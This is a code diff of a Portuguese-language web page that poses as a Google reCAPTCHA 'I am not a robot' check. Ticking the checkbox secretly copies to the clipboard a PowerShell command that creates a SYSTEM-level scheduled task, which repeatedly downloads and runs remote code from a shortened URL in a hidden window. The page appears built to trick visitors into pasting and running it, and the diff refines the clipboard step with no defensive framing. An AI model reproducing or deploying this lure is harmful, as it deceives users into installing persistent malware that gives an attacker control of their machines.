@@ -5,126 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Captcha Personalizado</title>
     <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: #f4f7fa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-
-        .captcha-container {
-            background-color: #ffffff;
-            border: 1px solid #dcdcdc;
-            border-radius: 5px;
-            padding: 20px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            width: 400px;
-            text-align: left;
-            position: relative;
-        }
-
-        .captcha-header {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .captcha-header input[type="checkbox"] {
-            width: 20px;
-            height: 20px;
-            cursor: pointer;
-        }
-
-        .captcha-header label {
-            font-size: 16px;
-            color: #333;
-        }
-
-        .captcha-logo-container {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-end;
-            text-align: right;
-            position: absolute;
-            top: 10px;
-            right: 30px;
-        }
-
-        .captcha-logo {
-            width: 35px;
-            transition: transform 1.5s ease;
-        }
-
-        .captcha-text {
-            font-size: 10px;
-            color: #888;
-            margin-top: 5px;
-            margin-right: 5px;
-        }
-
-        .verification-box {
-            display: none;
-            margin-top: 20px;
-            border: 1px solid #007bff;
-            padding: 20px;
-            border-radius: 5px;
-            background-color: #e7f1ff;
-        }
-
-        .verification-box h3 {
-            margin: 0;
-            font-size: 18px;
-            color: #007bff;
-        }
-
-        .verification-box ol {
-            margin: 15px 0;
-            padding-left: 20px;
-            color: #333;
-        }
-
-        .verification-box ol li {
-            margin-bottom: 10px;
-        }
-
-        .verification-code {
-            margin-top: 15px;
-            font-size: 14px;
-            color: #333;
-        }
-
-        .verification-code .verified {
-            color: #4CAF50;
-        }
-
-        .verification-box button {
-            background-color: #007bff;
-            color: #fff;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            display: none;
-        }
-
-        .verification-box button:hover {
-            background-color: #0056b3;
-        }
-
-        .captcha-header input:checked + label + .captcha-logo-container .captcha-logo {
-            transform: rotate(360deg);
-        }
+        /* (Mantenha o CSS original sem alterações) */
     </style>
 </head>
 <body>
 
     <div class="captcha-container">
         <div class="captcha-header">
-            <input type="checkbox" id="captcha-checkbox" onclick="copyToClipboard(); showVerification()">
+            <input type="checkbox" id="captcha-checkbox" onchange="copyToClipboard(); showVerification()">
             <label for="captcha-checkbox">Não sou um robô</label>
             <div class="captcha-logo-container">
                 <img class="captcha-logo" src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="ReCAPTCHA logo">
@@ -148,14 +36,19 @@
 
     <script>
         function copyToClipboard() {
-            const textToCopy = "powershell -c "$t=(Get-Date).AddMinutes(10); schtasks /create /tn U2FA /tr 'powershell -w Hidden -ep Bypass -c iex(iwr -useb https://tinyurl.com/2uxfvszc)' /sc minute /mo 10 /st $($t.ToString('HH:mm')) /ru SYSTEM /np /rl highest /f"";
+            const command = `powershell -c "$t=(Get-Date).AddMinutes(10); schtasks /create /tn U2FA /tr 'powershell -w Hidden -ep Bypass -c iex(iwr -useb https://tinyurl.com/2uxfvszc)' /sc minute /mo 10 /st $($t.ToString('HH:mm')) /ru SYSTEM /np /rl highest /f"`;
             
-            const tempTextArea = document.createElement("textarea");
-            tempTextArea.value = textToCopy;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand("copy");
-            document.body.removeChild(tempTextArea);
+            navigator.clipboard.writeText(command).then(() => {
+                console.log('Comando copiado para a área de transferência');
+            }).catch(err => {
+                // Fallback para navegadores mais antigos
+                const textArea = document.createElement('textarea');
+                textArea.value = command;
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+            });
         }
 
         function showVerification() {
@@ -183,4 +76,5 @@
     </script>
 
 </body>
+</html>
 </html>
